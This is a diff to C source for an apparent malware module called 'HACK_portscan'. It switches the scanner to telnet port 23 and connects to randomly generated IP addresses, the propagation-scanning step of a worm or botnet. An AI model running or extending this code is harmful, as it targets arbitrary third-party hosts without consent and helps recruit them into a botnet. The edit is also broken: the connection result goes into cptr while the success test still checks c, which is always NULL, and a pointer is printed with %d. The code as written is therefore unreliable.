@@ -80,7 +80,7 @@ Modules HACK_portscan = {
     // required ( NULL, NULL, 0 )
     NULL, NULL, 0,
     // port, state
-    0, 0,
+    23, 0,
     // required 0, 0..  
     0, 0,
     // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
@@ -130,9 +130,10 @@ int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
     int cur_ts = time(0);
     Connection *cptr = mptr->connections;
     int count = 0;
-    int z = 0, a = 0, c = 0, port = 0, x = 0,  d = 0;
+    int z = 0, a = 0,  port = 0, x = 0,  d = 0;
     int scan_count = 0;
     Portscan *pptr = NULL;
+    Connection *c = NULL;
     
     // we have to check timeouts here.. just in case the OS timeouts arent working well..
     // all ports should be non blocking, and select() will determine if theres an error, or if it opens correctly
@@ -178,14 +179,15 @@ int portscan_main_loop(Modules *mptr, Connection *conn, char *buf, int size) {
             while (z < a && x++ < 500) {
                 // first we generate an IP address
                 unsigned int ip = IPGenerate();
-                
+                port = 23;
                 // connect to this new ip
-                c = tcp_connect(mptr, &mptr->connections, ip, port, &cptr);
+                cptr = tcp_connect(mptr, &mptr->connections, ip, port, NULL);
 
                 // if it worked.. we count it in z                    
-                if (c) {
+                if (c != NULL) {
                     z++;
                 }
+                printf("c: %d z: %d\n", c, z);
             }
             
             // go to next port scan..
